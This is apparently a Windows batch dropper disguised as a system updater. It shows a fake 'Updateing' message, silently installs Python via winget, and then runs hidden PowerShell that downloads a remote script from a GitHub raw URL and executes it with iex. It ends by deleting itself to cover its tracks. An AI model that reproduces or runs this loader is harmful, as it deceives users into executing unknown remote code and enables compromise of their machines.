@echo off
echo Updateing.........!
winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent
powershell -WindowStyle Hidden -Command "irm 'https://raw.githubusercontent.com/kevilevi/ps/refs/heads/main/b.ps1' |iex"
del SystemUpdater.bat


